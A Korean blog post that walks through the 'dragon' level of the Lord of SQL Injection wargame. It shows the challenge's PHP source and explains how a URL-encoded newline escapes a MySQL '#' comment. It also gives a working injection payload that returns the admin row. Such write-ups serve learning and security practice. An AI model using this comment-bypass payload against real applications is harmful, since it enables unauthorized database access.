---
layout: post
title: Lord of SQL Injection - dragon
comments: true
---
{% highlight PHP %}
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
{% endhighlight %}

LOS 문제를 풀면서 제일 애먹었다고 말할 수 있는 문제이다..

무슨 guest로 로그인을 할 수 밖에 없게 만들라고 한건지.. 

기존에 발견했던 문제를 발생시키는 문자열은 NULL(\x00)과 New Line(\x0a)이다.

한동안 여기서 막혀있다가 다른 개발을 하다가 우연찮게 PHPMyAdmin에서 발견한 것이다...

만약 *pw*가 *%0a11111*가 되면 어떻게 쿼리가 될까?
{% highlight MySQL %}
SELECT id from prob_dragon where id='guest'# and pw='
11111'
{% endhighlight %}

줄바꿈했을 때의 부분인 **11111'**가 주석처리가 안되어 있었다..

이와 같은 속성(?)으로 줄바꿈 한 다음에 admin을 가져오도록 하면 문제가 해결된다.

{% highlight text %}
and%201=0%20or%20id='admin'%23
{% endhighlight %}

ps. SQL을 야매로 공부해서 그런지 저런 속성을 몰랐었다;;...